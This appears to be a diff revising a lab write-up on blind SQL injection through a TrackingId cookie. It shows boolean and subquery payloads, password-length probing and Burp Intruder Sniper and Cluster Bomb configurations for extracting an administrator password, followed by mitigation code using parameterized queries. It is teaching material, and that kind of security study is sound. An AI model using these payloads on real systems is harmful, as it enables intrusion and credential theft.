@@ -22,40 +22,39 @@ GET /filter?category=Pets HTTP/2
 
 **Injected Payload 1:**
 ```sql
-' AND '1'='1
+' AND 1=1--
 ```
 
 This returned a "Welcome back" message.
 
 **If the backend SQL query is:**
-```SQL
+```sql
 SELECT * FROM tracking WHERE id = 'abc123';
 ```
 
 **After injection, the Tracking ID becomes:**
 ```http
-Cookie: TrackingId=abc123' AND '1'='1;
+Cookie: TrackingId=abc123' AND 1=1--
 ```
 
 **The resulting backend SQL query becomes:**
 ```sql
-SELECT * FROM tracking WHERE id = 'abc123' AND '1'='1';
+SELECT * FROM tracking WHERE id = 'abc123' AND 1=1--';
 ```
 
-Since the injected expression `'1'='1'` is always true, the query executes successfully. No comment sequence (`--`) is needed because:
-- The injected value is already inside a string literal.
-- The rest of the query continues cleanly after the injection.
+Since the injected expression `1=1` is always true, the query executes successfully.
 
 **Injected Payload 2:**
 ```sql
-' AND '1'='2
+' AND 1=2--
 ```
 
 **The Tracking ID becomes:**
+```http
+Cookie: TrackingId=<ID>' AND 1=2--
 ```
-Cookie: TrackingId=<ID>' AND '1'='2;
-```
-This did not return a "Welcome back" message. This confirms that the query behaviour changes based on boolean condition in the injected payload — which means the SQL injection is working and the application is vulnerable to blind SQL injection.
+
+This did not return a "Welcome back" message. This confirms that the query behavior changes based on boolean condition in the injected payload — which means the SQL injection is working and the application is vulnerable to blind SQL injection.
 
 ### 3. Verified the Existence of the `users` Table
 
@@ -69,6 +68,12 @@ This returned a "Welcome back" message, confirming that a table named `users` ex
 
 Without LIMIT, `' AND (SELECT 'a' FROM users)='a` the subquery may return multiple rows, which causes an error (will not return the "Welcome back" message). SQL doesn't allow a **scalar subquery** (one used in a comparison like = 'a') to return multiple rows.
 
+No comment sequence (`--`) is needed because:
+- The injected value is already inside a string literal.
+- The rest of the query continues cleanly after the injection.
+
+However alternatively, `' AND (SELECT 'a' FROM users LIMIT 1)='a'--` also works.
+
 ### 4. Verified the `administrator` Username
 
 ```sql
@@ -76,6 +81,14 @@ Without LIMIT, `' AND (SELECT 'a' FROM users)='a` the subquery may return multip
 ```
 
 This returned a "Welcome back" message, confirming there is a user named `administrator`.
+
+Note: `' AND (SELECT username FROM users WHERE username='administrator')='administrator` will also work perfectly.
+
+```sql
+' AND (SELECT 'a' FROM users WHERE username='administratorhjdf')='a
+```
+
+This did not return a "Welcome back" message as expected as there is no user named `administratorhjdf`
 
 ### 5. Determined the Password Length and Sent to Intruder
 
@@ -91,7 +104,27 @@ Tried increasing values to identify the password length until the query returned
 
 This confirmed that the password length is 20.
 
-### 6. Retrieved the Password Using Intruder (Sniper Attack)
+> Note: `' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator` will also work perfectly.
+
+Alternatively, Intruder can be used to brute force the length(password):
+
+```sql
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+```
+
+Send this request to Intruder. In Burp Intruder, select `1` and click the **Add §** button, and with payload tab configuration:
+
+Payload type: numbers
+
+Payload: 1-40 (step 1)
+
+In the Grep-Match tab (from Settings), search for the value `Welcome back`, and start the Sniper attack.
+
+![burpsuite response](./misc-images/09-2.png)
+
+This will give a "Welcome back" message until 19, indicating the password length is 20.
+
+### 6. Retrieved the Password Using Intruder (Sniper Attack & Cluster Bomb Attack)
 
 ```sql
 ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
@@ -110,15 +143,14 @@ In Burp Intruder, select `a` and click the **Add §** button:
 ```sql
 ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`
 ```
+
 `§a§` is replaced with each character from the payload list.
 
 Payload tab configuration:
 Payload type: simple list
 Payload set: a-z and 0-9 (assuming no uppercase letters)
 
-In the Grep-Match tab (from Settings), search for the value `Welcome back`.
-
-Start the Sniper attack.
+In the Grep-Match tab (from Settings), search for the value `Welcome back`, and start the Sniper attack.
 
 This returned a "Welcome back" message only for character `m`, indicating that `m` is the first character of the password.
 
@@ -135,15 +167,33 @@ Repeated the process for all 20 characters and successfully retrieved the comple
 
 Logged in as the administrator using the retrieved password.
 
+Alternatively, `Cluster bomb attack` can be used to retrieve all characters at once:
+
+![burpsuite response](./misc-images/09-3.png)
+
+```sql
+' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§`
+```
+
+Payload for `1`: 1-20
+
+Payload for `a`: a-z and 0-9
+
+Grep-Match: Welcome back
+
+![burpsuite response](./misc-images/09-4.png)
+
+This method retrieves all 20 characters at once making the process simpler but as this has 720 combinations it will take hours with community edition of Burp Suite.
+
 ---
 
 ## Mitigation
 
-- Use parameterised queries (prepped statements) instead of building SQL statements with user input. This prevents user-controlled input from being executed as SQL code.
+- Use parameterized queries (prepared statements) instead of building SQL statements with user input. This prevents user-controlled input from being executed as SQL code.
 
 Insecure code (Python):
 ```py
-tracking_id = request.cookies.get['TrackingId']
+tracking_id = request.cookies.get('TrackingId')
 query = "SELECT * FROM tracking WHERE id = '" + tracking_id + "'"
 cursor.execute(query)  # Vulnerable to SQL injection
 ```
@@ -162,13 +212,13 @@ cursor.execute(query, (tracking_id,))
 
 ## Reflection
 
-Learned how blind SQL injection can be used to extract data character-by-character using conditional responses and boolean logic.
+Learned how blind SQL injection can be used to extract data character-by-character using conditional responses and boolean logic. Also learned about Sniper attack and cluster bomb attack using Burp Suite.
 
 ---
 
 ## Notes
 
-1. Testing with `'` and `''` helps determine whether input is placed within a SQL string and if it's properly escaped. Testing `'` and `''`, both not give a "Welcome back" message.
+1. Testing with `'` and `''` helps determine whether input is placed within a SQL string and if it's properly escaped. Testing `'` and `''`, both do not give a "Welcome back" message.
 
 2. In GET/POST parameter injection, your input often breaks the SQL query unless it's followed by a comment sequence (`--` or `#`) to ignore the rest of the query.
 
@@ -181,14 +231,18 @@ A payload like `' AND '1'='1` works in Tracking ID because the injection point i
 - Analytics (e.g., counting visits)
 - A/B testing or content personalization
 - Logging user activity or session tracking on the server
-It’s a way to identify users or sessions without authentication, often stored in cookies.
+It's a way to identify users or sessions without authentication, often stored in cookies.
 
-5. `request.cookies` is a dictionary-like object in Flask. `tracking_id = request.cookies('TrackingId')` can raise `KeyError` if cookie is missing.	
+5. `request.cookies` is a dictionary-like object in Flask. `tracking_id = request.cookies['TrackingId']` can raise `KeyError` if cookie is missing.	
 
 Use `tracking_id = request.cookies.get('TrackingId', '')` instead.
 
+**Dictionary Access vs Method Calls:**
+- `[]` is used for direct dictionary access: `request.cookies['TrackingId']` - raises `KeyError` if key doesn't exist
+- `()` is used for method calls: `request.cookies.get('TrackingId', '')` - returns default value if key doesn't exist
+
 This says:
-- "Try to get the cookie called 'TrackingId', but if it’s missing, just give me an empty string ('') instead — and don’t crash."
+- "Try to get the cookie called 'TrackingId', but if it's missing, just give me an empty string ('') instead — and don't crash."
 - The `.get()` method is like asking nicely and giving it a backup plan.
 
 If your app crashes with an error like `KeyError`, it can:
